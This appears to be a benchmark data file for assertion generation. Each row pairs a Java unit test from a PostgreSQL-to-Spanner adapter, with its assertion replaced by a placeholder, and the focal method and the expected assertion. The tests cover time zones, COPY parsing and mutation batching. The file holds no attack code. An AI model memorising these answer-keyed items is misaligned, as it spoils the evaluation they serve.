"testTimeZoneBootVal() { Map<String, PGSetting> originalSettings = ImmutableMap.copyOf(SessionState.SERVER_SETTINGS); SessionState.SERVER_SETTINGS.put( ""TimeZone"", new PGSetting( null, ""TimeZone"", null, null, null, null, null, null, null, null, null, null, null, ""Europe/Oslo"", null, null, null, false)); try { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); SessionState state = new SessionState(ImmutableMap.of(), optionsMetadata); ""<AssertPlaceHolder>""; } finally { SessionState.SERVER_SETTINGS.putAll(originalSettings); } }
getTimezone() { if (cachedZoneId != null) { return cachedZoneId; } PGSetting setting = internalGet(toKey(null, ""timezone""), false); if (setting == null) { return ZoneId.systemDefault(); } String id = tryGetFirstNonNull( ZoneId.systemDefault().getId(), setting::getSetting, setting::getResetVal, setting::getBootVal);  return (cachedZoneId = zoneIdFromString(id)); }"	"assertEquals(""Europe/Oslo"", state.getTimezone().getId())"
"testGetInvalidTimeZone() { Map<String, PGSetting> originalSettings = ImmutableMap.copyOf(SessionState.SERVER_SETTINGS); SessionState.SERVER_SETTINGS.put( ""TimeZone"", new PGSetting( null, ""TimeZone"", null, null, null, null, null, null, null, null, ""foo/bar"", null, null, null, null, null, null, false)); try { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); SessionState state = new SessionState(ImmutableMap.of(), optionsMetadata); ""<AssertPlaceHolder>""; } finally { SessionState.SERVER_SETTINGS.putAll(originalSettings); } }
getTimezone() { if (cachedZoneId != null) { return cachedZoneId; } PGSetting setting = internalGet(toKey(null, ""timezone""), false); if (setting == null) { return ZoneId.systemDefault(); } String id = tryGetFirstNonNull( ZoneId.systemDefault().getId(), setting::getSetting, setting::getResetVal, setting::getBootVal);  return (cachedZoneId = zoneIdFromString(id)); }"	assertEquals(TimeZone.getDefault().toZoneId(), state.getTimezone())
"Exception { ConnectionHandler connectionHandler = mock(ConnectionHandler.class); OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(connectionHandler.getConnectionMetadata()).thenReturn(mock(ConnectionMetadata.class)); Statement statement = Statement.of(""close foo""); ParsedStatement parsedStatement = AbstractStatementParser.getInstance(Dialect.POSTGRESQL).parse(statement); CloseStatement closeStatement = new CloseStatement(connectionHandler, optionsMetadata, """", parsedStatement, statement); Future<StatementResult> result = closeStatement.describeAsync(mock(BackendConnection.class)); ""<AssertPlaceHolder>""; }
describeAsync(BackendConnection backendConnection) { // Return null to indicate that this CLOSE statement does not return any // RowDescriptionResponse. return Futures.immediateFuture(null); }"	assertNull(result.get())
"Exception { ConnectionHandler connectionHandler = mock(ConnectionHandler.class); OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(connectionHandler.getConnectionMetadata()).thenReturn(mock(ConnectionMetadata.class)); Statement statement = Statement.of(""declare foo cursor for select 1""); ParsedStatement parsedStatement = AbstractStatementParser.getInstance(Dialect.POSTGRESQL).parse(statement); DeclareStatement declareStatement = new DeclareStatement(connectionHandler, optionsMetadata, """", parsedStatement, statement); Future<StatementResult> result = declareStatement.describeAsync(mock(BackendConnection.class)); ""<AssertPlaceHolder>""; }
describeAsync(BackendConnection backendConnection) { // Return null to indicate that this DECLARE statement does not return any // RowDescriptionResponse. return Futures.immediateFuture(null); }"	assertNull(result.get())
"testBuffer() { ParseMessage parseMessage = mock(ParseMessage.class); BindMessage bindMessage = mock(BindMessage.class); DescribeMessage describeMessage = mock(DescribeMessage.class); ExecuteMessage executeMessage = mock(ExecuteMessage.class);  ExtendedQueryProtocolHandler handler = new ExtendedQueryProtocolHandler(connectionHandler, backendConnection); handler.buffer(parseMessage); handler.buffer(bindMessage); handler.buffer(describeMessage); handler.buffer(executeMessage);  ""<AssertPlaceHolder>""; }
getMessages() { return new ArrayList<>(messages); }"	assertEquals( ImmutableList.of(parseMessage, bindMessage, describeMessage, executeMessage), handler.getMessages())
"Exception { when(connectionHandler.getSpannerConnection()).thenReturn(connection); when(connectionHandler.getConnectionMetadata()).thenReturn(connectionMetadata); Future<StatementResult> future = mock(Future.class); when(future.get()).thenThrow(new InterruptedException());  String sql = ""update bar set foo=1""; IntermediateStatement statement = new IntermediateStatement( mock(OptionsMetadata.class), parse(sql), Statement.of(sql), connectionHandler); statement.setFutureStatementResult(future); statement.initFutureResult(ResultNotReadyBehavior.BLOCK);  PGException pgException = statement.getException(); ""<AssertPlaceHolder>""; }
getException() { return this.exception; }"	assertEquals(SQLState.QueryCanceled, pgException.getSQLState())
"testAddCommonTableExpressions() { Statement statement = Statement.of(""select * from my_table""); PgCatalog catalog = new PgCatalog(mock(SessionState.class), WellKnownClient.UNSPECIFIED); ""<AssertPlaceHolder>""; }
addCommonTableExpressions(Statement statement, ImmutableList<String> tableExpressions) { if (tableExpressions.isEmpty()) { return statement; }  Tuple<String, ReplacementStatus> result = replaceKnownUnsupportedFunctions(statement); String sql = result.x(); Statement.Builder builder; if (result.y() == ReplacementStatus.CONTINUE) { SimpleParser parser = new SimpleParser(sql); boolean hadCommonTableExpressions = parser.eatKeyword(""with""); String tableExpressionsSql = String.join("",\n"", tableExpressions); builder = Statement.newBuilder(""with "") .append(tableExpressionsSql) .append(hadCommonTableExpressions ? "",\n"" : ""\n""); if (hadCommonTableExpressions) { // Include the entire original statement except the 'with' keyword. builder .append(parser.getSql().substring(0, parser.getPos() - 4)) .append(parser.getSql().substring(parser.getPos())); } else { // Include the entire original statement (including any comments at the beginning). builder.append(parser.getSql()); } } else { builder = Statement.newBuilder(sql); } Map<String, Value> parameters = statement.getParameters(); for (Entry<String, Value> param : parameters.entrySet()) { builder.bind(param.getKey()).to(param.getValue()); } statement = builder.build(); return statement; }"	assertSame(statement, catalog.addCommonTableExpressions(statement, ImmutableList.of()))
"testParseShowAll() { ""<AssertPlaceHolder>""; }
parse(ParsedStatement parsedStatement) { if (parsedStatement.getType() == StatementType.CLIENT_SIDE && parsedStatement.getClientSideStatementType() != ClientSideStatementType.RESET_ALL) { // This statement is handled by the Connection API. return null; } SimpleParser parser = new SimpleParser(parsedStatement.getSqlWithoutComments()); if (parser.eatKeyword(""set"")) { return parseSetStatement(parser); } if (parser.eatKeyword(""reset"")) { return parseResetStatement(parser); } if (parser.eatKeyword(""show"")) { return parseShowStatement(parser); }  return null; }"	"assertEquals( ShowStatement.createShowAll(), SessionStatementParser.parse(PG_PARSER.parse(Statement.of(""show all""))))"
"testParseResetAll() { ""<AssertPlaceHolder>""; }
parse(ParsedStatement parsedStatement) { if (parsedStatement.getType() == StatementType.CLIENT_SIDE && parsedStatement.getClientSideStatementType() != ClientSideStatementType.RESET_ALL) { // This statement is handled by the Connection API. return null; } SimpleParser parser = new SimpleParser(parsedStatement.getSqlWithoutComments()); if (parser.eatKeyword(""set"")) { return parseSetStatement(parser); } if (parser.eatKeyword(""reset"")) { return parseResetStatement(parser); } if (parser.eatKeyword(""show"")) { return parseShowStatement(parser); }  return null; }"	"assertEquals( ResetStatement.createResetAll(), SessionStatementParser.parse(PG_PARSER.parse(Statement.of(""reset all""))))"
"testGetSql() { ConnectionHandler connectionHandler = mock(ConnectionHandler.class); ListDatabasesStatement statement = new ListDatabasesStatement(connectionHandler);  ""<AssertPlaceHolder>""; }
getSql() { return new String[] {LIST_DATABASES_SQL}; }"	assertArrayEquals(new String[] {ListDatabasesStatement.LIST_DATABASES_SQL}, statement.getSql())
"IOException { PipedOutputStream pipedOutputStream = new PipedOutputStream(); BinaryCopyParser parser = new BinaryCopyParser(new PipedInputStream(pipedOutputStream, 256));  DataOutputStream data = new DataOutputStream(pipedOutputStream); data.write(COPY_BINARY_HEADER); data.writeInt(0); // flags data.writeInt(0); // header extensions length  ""<AssertPlaceHolder>""; }
iterator() { Preconditions.checkState(!this.calledIterator, ""Can only call iterator() once""); this.calledIterator = true;  try { // The PostgreSQL binary copy format uses a fixed header to indicate that it is a file/stream // in binary format. verifyBinaryHeader(); // The fixed header is followed by two ints: // 1. flags: Contains specific flags for the binary copy format. // 2. header extension length: Currently zero, but if anything else is encountered, this // parser just skips it. This is according to spec, as a reader should skip any extension it // does not know. int flags = this.dataInputStream.readInt(); this.containsOids = ((flags & (1L << 16)) != 0); // This should according to the current spec always be zero. // But if it happens not to be so, we should just skip the following bytes. int headerExtensionLength = this.dataInputStream.readInt(); while (headerExtensionLength > 0) { headerExtensionLength -= this.dataInputStream.skip(headerExtensionLength); } } catch (IOException ioException) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.INTERNAL, ""Failed to read binary file header"", ioException); }  return new BinaryIterator(); }"	assertNotNull(parser.iterator())
"IOException { PipedOutputStream pipedOutputStream = new PipedOutputStream(); BinaryCopyParser parser = new BinaryCopyParser(new PipedInputStream(pipedOutputStream, 256));  DataOutputStream data = new DataOutputStream(pipedOutputStream); data.write(COPY_BINARY_HEADER); data.writeInt(0); data.writeInt(0);  // Write trailer. data.writeShort(-1);  Iterator<CopyRecord> iterator = parser.iterator(); ""<AssertPlaceHolder>""; }
hasNext() { try { // The hasNext status is UNKNOWN if a call to next() has been executed since the last time // hasNext() was called, or if this is the first time hasNext() is called. if (hasNext == HasNext.UNKNOWN) { // The first value in a row is the number of fields in that row. The value will be -1 for // the last tuple (this is the file trailer). The value should be the same for all other // rows. short fieldCount = dataInputStream.readShort(); if (fieldCount == -1) { logger.log(Level.FINE, ""End of copy file: -1""); hasNext = HasNext.NO; } else if (fieldCount > -1) { if (firstRowFieldCount == -1) { firstRowFieldCount = fieldCount; currentRow = new BinaryField[fieldCount]; } else if (firstRowFieldCount != fieldCount) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, String.format( ""Invalid field count encountered: %d, expected %d"", fieldCount, firstRowFieldCount)); } hasNext = HasNext.YES; } else { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, String.format(""Invalid field count encountered: %d"", fieldCount)); } } return hasNext == HasNext.YES; } catch (EOFException eofException) { // The protocol specifies that the stream should contain a -1 as the trailer in the file, // but it seems that some clients do not include this. logger.log(Level.FINE, ""EOF in BinaryCopyParser""); hasNext = HasNext.NO; return false; } catch (IOException ioException) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.INTERNAL, ioException.getMessage(), ioException); } }"	assertFalse(iterator.hasNext())
"IOException { PipedOutputStream pipedOutputStream = new PipedOutputStream(); BinaryCopyParser parser = new BinaryCopyParser(new PipedInputStream(pipedOutputStream, 256));  DataOutputStream data = new DataOutputStream(pipedOutputStream); data.write(COPY_BINARY_HEADER); data.writeInt(0); data.writeInt(0);  // Closing the underlying output stream causes an EOFException. This is handled internally and // considered an indication that there are no more rows. pipedOutputStream.close();  Iterator<CopyRecord> iterator = parser.iterator(); ""<AssertPlaceHolder>""; }
hasNext() { try { // The hasNext status is UNKNOWN if a call to next() has been executed since the last time // hasNext() was called, or if this is the first time hasNext() is called. if (hasNext == HasNext.UNKNOWN) { // The first value in a row is the number of fields in that row. The value will be -1 for // the last tuple (this is the file trailer). The value should be the same for all other // rows. short fieldCount = dataInputStream.readShort(); if (fieldCount == -1) { logger.log(Level.FINE, ""End of copy file: -1""); hasNext = HasNext.NO; } else if (fieldCount > -1) { if (firstRowFieldCount == -1) { firstRowFieldCount = fieldCount; currentRow = new BinaryField[fieldCount]; } else if (firstRowFieldCount != fieldCount) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, String.format( ""Invalid field count encountered: %d, expected %d"", fieldCount, firstRowFieldCount)); } hasNext = HasNext.YES; } else { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, String.format(""Invalid field count encountered: %d"", fieldCount)); } } return hasNext == HasNext.YES; } catch (EOFException eofException) { // The protocol specifies that the stream should contain a -1 as the trailer in the file, // but it seems that some clients do not include this. logger.log(Level.FINE, ""EOF in BinaryCopyParser""); hasNext = HasNext.NO; return false; } catch (IOException ioException) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.INTERNAL, ioException.getMessage(), ioException); } }"	assertFalse(iterator.hasNext())
"Exception { Map<String, Type> tableColumns = ImmutableMap.of(""number"", Type.int64(), ""name"", Type.string()); CSVFormat format = CSVFormat.POSTGRESQL_TEXT .builder() .setHeader(tableColumns.keySet().toArray(new String[0])) .build(); SessionState sessionState = new SessionState(mock(OptionsMetadata.class)); Connection connection = mock(Connection.class); DatabaseClient databaseClient = mock(DatabaseClient.class); when(connection.getDatabaseClient()).thenReturn(databaseClient); MutationWriter mutationWriter = new MutationWriter( sessionState, CopyTransactionMode.ImplicitAtomic, connection, ""numbers"", tableColumns, /* indexedColumnsCount = */ 1, Format.TEXT, format, false);  Future<?> fut = executor.submit( () -> { try { mutationWriter.addCopyData(""1\tOne\n2\tTwo\n"".getBytes(StandardCharsets.UTF_8)); mutationWriter.commit(); mutationWriter.close(); } catch (IOException ignore) { } });  StatementResult updateCount = mutationWriter.call(); fut.get();  ""<AssertPlaceHolder>""; List<Mutation> expectedMutations = ImmutableList.of( Mutation.newInsertBuilder(""numbers"").set(""number"").to(1L).set(""name"").to(""One"").build(), Mutation.newInsertBuilder(""numbers"") .set(""number"") .to(2L) .set(""name"") .to(""Two"") .build()); verify(databaseClient).writeWithOptions(eq(expectedMutations), any()); }
call() throws Exception { PipedInputStream inputStream = new PipedInputStream(payload, copySettings.getPipeBufferSize()); pipeCreatedLatch.countDown(); final CopyInParser parser = CopyInParser.create( copySettings.getSessionState(), copyFormat, csvFormat, inputStream, hasHeader); // This LinkedBlockingDeque holds a reference to all transactions that are currently active. The // max capacity of this deque is what ensures that we never have more than maxParallelism // transactions running at the same time. We could also achieve that by using a thread pool with // a fixed number of threads. The problem with that is however that Java does not have a thread // pool implementation that will block if a new task is offered and all threads are currently in // use. The only options are 'fail or add to queue'. We want to block our worker thread in this // case when the max parallel transactions has been reached, as that automatically creates back- // pressure in our entire pipeline that consists of: // Client app (psql) -> CopyData message -> CSVParser -> Transaction. LinkedBlockingDeque<ApiFuture<Void>> activeCommitFutures = new LinkedBlockingDeque<>(copySettings.getMaxParallelism()); // This list holds all transactions that we have started. We will wait on this entire list // before finishing, to ensure that all data has been written before we signal that we are done. List<ApiFuture<Void>> allCommitFutures = new ArrayList<>(); try { // Wait until we know whether we actually will receive any data. It could be that it is an // empty copy operation, and we should then end early. dataReceivedLatch.await();  Iterator<CopyRecord> iterator = parser.iterator(); List<Mutation> mutations = new ArrayList<>(); long currentBufferByteSize = 0L; // Note: iterator.hasNext() blocks if there is not enough data in the pipeline to construct a // complete record. It returns false if the stream has been closed and all records have been // returned. while (bytesReceived.get() > 0L && !rollback.get() && iterator.hasNext()) { CopyRecord record = iterator.next(); if (record.isEndRecord()) { break; } if (record.numColumns() != this.tableColumns.keySet().size()) { throw PGExceptionFactory.newPGException( String.format( ""Invalid COPY data: Row length mismatch. Expected %d values, but got %d."", this.tableColumns.keySet().size(), record.numColumns()), SQLState.DataException); }  Mutation mutation = buildMutation(record); int mutationSize = calculateSize(mutation); this.rowCount++;  if (transactionMode == CopyTransactionMode.ImplicitNonAtomic) { currentBufferByteSize = addMutationAndMaybeFlushTransaction( activeCommitFutures, allCommitFutures, mutations, mutation, currentBufferByteSize, mutationSize); } else { mutations.add(mutation); currentBufferByteSize += mutationSize; if (mutations.size() > maxAtomicBatchSize) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Record count: "" + mutations.size() + "" has exceeded the limit: "" + maxAtomicBatchSize + "".\n\nThe number of mutations per record is equal to the number of columns in the record "" + ""plus the number of indexed columns in the record. The maximum number of mutations "" + ""in one transaction is "" + copySettings.getMaxAtomicMutationsLimit() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } if (currentBufferByteSize > copySettings.getMaxAtomicCommitSize()) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Commit size: "" + currentBufferByteSize + "" has exceeded the limit: "" + copySettings.getMaxAtomicCommitSize() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } } } // end of iterator.hasNext()  // There are no more CSVRecords in the pipeline. // Write any remaining mutations in the buffer. if (!rollback.get() && !mutations.isEmpty()) { if (transactionMode == CopyTransactionMode.Explicit) { connection.write(mutations); } else { // Wait until we have received a CopyDone message before writing the remaining data to // Spanner. If we are in a non-atomic transaction, there might already be data that have // been written to Spanner. closedLatch.await(); if (commit.get()) { allCommitFutures.add(writeToSpannerAsync(activeCommitFutures, mutations)); } } } // Wait for all commits to finish. We do this even if something went wrong, as it ensures two // things: // 1. All commits that were in flight when something went wrong will finish before we return //    an error to the client application. This prevents commits still being added to the //    database after we have returned an error, which could cause confusion. // 2. This will throw the underlying exception, so we can catch and register it. ApiFutures.allAsList(allCommitFutures).get(); } catch (SpannerException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } catch (ExecutionException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e.getCause()); throw this.exception; } } catch (Exception e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } finally { this.executorService.shutdown(); if (!this.executorService.awaitTermination(60L, TimeUnit.SECONDS)) { logger.log(Level.WARNING, ""Timeout while waiting for MutationWriter executor to shutdown.""); } this.payload.close(); parser.close(); } return new UpdateCount(rowCount); }"	assertEquals(2L, updateCount.getUpdateCount().longValue())
"Exception { // 6 == 2 mutations per batch, as we have 2 columns + 1 indexed column. System.setProperty(""copy_in_mutation_limit"", ""6""); try { Map<String, Type> tableColumns = ImmutableMap.of(""number"", Type.int64(), ""name"", Type.string()); CSVFormat format = CSVFormat.POSTGRESQL_TEXT .builder() .setHeader(tableColumns.keySet().toArray(new String[0])) .build(); SessionState sessionState = new SessionState(mock(OptionsMetadata.class)); // 6 == 2 mutations per batch, as we have 2 columns + 1 indexed column. sessionState.set(""spanner"", ""copy_batch_size"", ""6""); sessionState.commit(); Connection connection = mock(Connection.class); DatabaseClient databaseClient = mock(DatabaseClient.class); when(connection.getDatabaseClient()).thenReturn(databaseClient);  MutationWriter mutationWriter = new MutationWriter( sessionState, CopyTransactionMode.ImplicitNonAtomic, connection, ""numbers"", tableColumns, /* indexedColumnsCount = */ 1, Format.TEXT, format, false);  executor.submit( () -> { try { mutationWriter.addCopyData( ""1\t""One""\n2\t""Two""\n3\t""Three""\n4\t""Four""\n5\t""Five""\n"" .getBytes(StandardCharsets.UTF_8)); mutationWriter.commit(); mutationWriter.close(); } catch (IOException ignore) { } });  StatementResult updateCount = mutationWriter.call();  ""<AssertPlaceHolder>""; verify(databaseClient, times(3)).writeWithOptions(anyIterable(), any()); } finally { System.getProperties().remove(""copy_in_mutation_limit""); } }
call() throws Exception { PipedInputStream inputStream = new PipedInputStream(payload, copySettings.getPipeBufferSize()); pipeCreatedLatch.countDown(); final CopyInParser parser = CopyInParser.create( copySettings.getSessionState(), copyFormat, csvFormat, inputStream, hasHeader); // This LinkedBlockingDeque holds a reference to all transactions that are currently active. The // max capacity of this deque is what ensures that we never have more than maxParallelism // transactions running at the same time. We could also achieve that by using a thread pool with // a fixed number of threads. The problem with that is however that Java does not have a thread // pool implementation that will block if a new task is offered and all threads are currently in // use. The only options are 'fail or add to queue'. We want to block our worker thread in this // case when the max parallel transactions has been reached, as that automatically creates back- // pressure in our entire pipeline that consists of: // Client app (psql) -> CopyData message -> CSVParser -> Transaction. LinkedBlockingDeque<ApiFuture<Void>> activeCommitFutures = new LinkedBlockingDeque<>(copySettings.getMaxParallelism()); // This list holds all transactions that we have started. We will wait on this entire list // before finishing, to ensure that all data has been written before we signal that we are done. List<ApiFuture<Void>> allCommitFutures = new ArrayList<>(); try { // Wait until we know whether we actually will receive any data. It could be that it is an // empty copy operation, and we should then end early. dataReceivedLatch.await();  Iterator<CopyRecord> iterator = parser.iterator(); List<Mutation> mutations = new ArrayList<>(); long currentBufferByteSize = 0L; // Note: iterator.hasNext() blocks if there is not enough data in the pipeline to construct a // complete record. It returns false if the stream has been closed and all records have been // returned. while (bytesReceived.get() > 0L && !rollback.get() && iterator.hasNext()) { CopyRecord record = iterator.next(); if (record.isEndRecord()) { break; } if (record.numColumns() != this.tableColumns.keySet().size()) { throw PGExceptionFactory.newPGException( String.format( ""Invalid COPY data: Row length mismatch. Expected %d values, but got %d."", this.tableColumns.keySet().size(), record.numColumns()), SQLState.DataException); }  Mutation mutation = buildMutation(record); int mutationSize = calculateSize(mutation); this.rowCount++;  if (transactionMode == CopyTransactionMode.ImplicitNonAtomic) { currentBufferByteSize = addMutationAndMaybeFlushTransaction( activeCommitFutures, allCommitFutures, mutations, mutation, currentBufferByteSize, mutationSize); } else { mutations.add(mutation); currentBufferByteSize += mutationSize; if (mutations.size() > maxAtomicBatchSize) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Record count: "" + mutations.size() + "" has exceeded the limit: "" + maxAtomicBatchSize + "".\n\nThe number of mutations per record is equal to the number of columns in the record "" + ""plus the number of indexed columns in the record. The maximum number of mutations "" + ""in one transaction is "" + copySettings.getMaxAtomicMutationsLimit() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } if (currentBufferByteSize > copySettings.getMaxAtomicCommitSize()) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Commit size: "" + currentBufferByteSize + "" has exceeded the limit: "" + copySettings.getMaxAtomicCommitSize() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } } } // end of iterator.hasNext()  // There are no more CSVRecords in the pipeline. // Write any remaining mutations in the buffer. if (!rollback.get() && !mutations.isEmpty()) { if (transactionMode == CopyTransactionMode.Explicit) { connection.write(mutations); } else { // Wait until we have received a CopyDone message before writing the remaining data to // Spanner. If we are in a non-atomic transaction, there might already be data that have // been written to Spanner. closedLatch.await(); if (commit.get()) { allCommitFutures.add(writeToSpannerAsync(activeCommitFutures, mutations)); } } } // Wait for all commits to finish. We do this even if something went wrong, as it ensures two // things: // 1. All commits that were in flight when something went wrong will finish before we return //    an error to the client application. This prevents commits still being added to the //    database after we have returned an error, which could cause confusion. // 2. This will throw the underlying exception, so we can catch and register it. ApiFutures.allAsList(allCommitFutures).get(); } catch (SpannerException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } catch (ExecutionException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e.getCause()); throw this.exception; } } catch (Exception e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } finally { this.executorService.shutdown(); if (!this.executorService.awaitTermination(60L, TimeUnit.SECONDS)) { logger.log(Level.WARNING, ""Timeout while waiting for MutationWriter executor to shutdown.""); } this.payload.close(); parser.close(); } return new UpdateCount(rowCount); }"	assertEquals(5L, updateCount.getUpdateCount().longValue())
"Exception { System.setProperty(""copy_in_commit_limit"", ""80""); try { Map<String, Type> tableColumns = ImmutableMap.of(""number"", Type.int64(), ""name"", Type.string()); CSVFormat format = CSVFormat.POSTGRESQL_TEXT .builder() .setHeader(tableColumns.keySet().toArray(new String[0])) .build(); SessionState sessionState = new SessionState(mock(OptionsMetadata.class)); Connection connection = mock(Connection.class); DatabaseClient databaseClient = mock(DatabaseClient.class); when(connection.getDatabaseClient()).thenReturn(databaseClient);  MutationWriter mutationWriter = new MutationWriter( sessionState, CopyTransactionMode.ImplicitNonAtomic, connection, ""numbers"", tableColumns, /* indexedColumnsCount = */ 1, Format.TEXT, format, false);  executor.submit( () -> { try { mutationWriter.addCopyData( ""1\tOne\n2\tTwo\n3\tThree\n4\tFour\n5\tFive\n"".getBytes(StandardCharsets.UTF_8)); mutationWriter.commit(); mutationWriter.close(); } catch (IOException ignore) { } });  StatementResult updateCount = mutationWriter.call();  ""<AssertPlaceHolder>""; // We expect two batches, because: // 1. The commit limit is 80 bytes. That is for safety halved down to 40 bytes. // 2. Each record is 20 bytes. // 3. The first batch contains 20 + 20 bytes. // 4. The second batch contains 28 bytes. (3 - 'Three') // 5. The third batch contains 24 bytes. (4 - 'Four') // 6. the fourth batch contains 24 bytes. (5 - 'Five') verify(databaseClient, times(4)).writeWithOptions(anyIterable(), any()); } finally { System.getProperties().remove(""copy_in_commit_limit""); } }
call() throws Exception { PipedInputStream inputStream = new PipedInputStream(payload, copySettings.getPipeBufferSize()); pipeCreatedLatch.countDown(); final CopyInParser parser = CopyInParser.create( copySettings.getSessionState(), copyFormat, csvFormat, inputStream, hasHeader); // This LinkedBlockingDeque holds a reference to all transactions that are currently active. The // max capacity of this deque is what ensures that we never have more than maxParallelism // transactions running at the same time. We could also achieve that by using a thread pool with // a fixed number of threads. The problem with that is however that Java does not have a thread // pool implementation that will block if a new task is offered and all threads are currently in // use. The only options are 'fail or add to queue'. We want to block our worker thread in this // case when the max parallel transactions has been reached, as that automatically creates back- // pressure in our entire pipeline that consists of: // Client app (psql) -> CopyData message -> CSVParser -> Transaction. LinkedBlockingDeque<ApiFuture<Void>> activeCommitFutures = new LinkedBlockingDeque<>(copySettings.getMaxParallelism()); // This list holds all transactions that we have started. We will wait on this entire list // before finishing, to ensure that all data has been written before we signal that we are done. List<ApiFuture<Void>> allCommitFutures = new ArrayList<>(); try { // Wait until we know whether we actually will receive any data. It could be that it is an // empty copy operation, and we should then end early. dataReceivedLatch.await();  Iterator<CopyRecord> iterator = parser.iterator(); List<Mutation> mutations = new ArrayList<>(); long currentBufferByteSize = 0L; // Note: iterator.hasNext() blocks if there is not enough data in the pipeline to construct a // complete record. It returns false if the stream has been closed and all records have been // returned. while (bytesReceived.get() > 0L && !rollback.get() && iterator.hasNext()) { CopyRecord record = iterator.next(); if (record.isEndRecord()) { break; } if (record.numColumns() != this.tableColumns.keySet().size()) { throw PGExceptionFactory.newPGException( String.format( ""Invalid COPY data: Row length mismatch. Expected %d values, but got %d."", this.tableColumns.keySet().size(), record.numColumns()), SQLState.DataException); }  Mutation mutation = buildMutation(record); int mutationSize = calculateSize(mutation); this.rowCount++;  if (transactionMode == CopyTransactionMode.ImplicitNonAtomic) { currentBufferByteSize = addMutationAndMaybeFlushTransaction( activeCommitFutures, allCommitFutures, mutations, mutation, currentBufferByteSize, mutationSize); } else { mutations.add(mutation); currentBufferByteSize += mutationSize; if (mutations.size() > maxAtomicBatchSize) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Record count: "" + mutations.size() + "" has exceeded the limit: "" + maxAtomicBatchSize + "".\n\nThe number of mutations per record is equal to the number of columns in the record "" + ""plus the number of indexed columns in the record. The maximum number of mutations "" + ""in one transaction is "" + copySettings.getMaxAtomicMutationsLimit() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } if (currentBufferByteSize > copySettings.getMaxAtomicCommitSize()) { throw SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""Commit size: "" + currentBufferByteSize + "" has exceeded the limit: "" + copySettings.getMaxAtomicCommitSize() + "".\n\nExecute `SET SPANNER.AUTOCOMMIT_DML_MODE='PARTITIONED_NON_ATOMIC'` before executing a large COPY operation "" + ""to instruct PGAdapter to automatically break large transactions into multiple smaller. "" + ""This will make the COPY operation non-atomic.\n\n""); } } } // end of iterator.hasNext()  // There are no more CSVRecords in the pipeline. // Write any remaining mutations in the buffer. if (!rollback.get() && !mutations.isEmpty()) { if (transactionMode == CopyTransactionMode.Explicit) { connection.write(mutations); } else { // Wait until we have received a CopyDone message before writing the remaining data to // Spanner. If we are in a non-atomic transaction, there might already be data that have // been written to Spanner. closedLatch.await(); if (commit.get()) { allCommitFutures.add(writeToSpannerAsync(activeCommitFutures, mutations)); } } } // Wait for all commits to finish. We do this even if something went wrong, as it ensures two // things: // 1. All commits that were in flight when something went wrong will finish before we return //    an error to the client application. This prevents commits still being added to the //    database after we have returned an error, which could cause confusion. // 2. This will throw the underlying exception, so we can catch and register it. ApiFutures.allAsList(allCommitFutures).get(); } catch (SpannerException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } catch (ExecutionException e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e.getCause()); throw this.exception; } } catch (Exception e) { synchronized (lock) { this.exception = PGExceptionFactory.toPGException(e); throw this.exception; } } finally { this.executorService.shutdown(); if (!this.executorService.awaitTermination(60L, TimeUnit.SECONDS)) { logger.log(Level.WARNING, ""Timeout while waiting for MutationWriter executor to shutdown.""); } this.payload.close(); parser.close(); } return new UpdateCount(rowCount); }"	assertEquals(5L, updateCount.getUpdateCount().longValue())
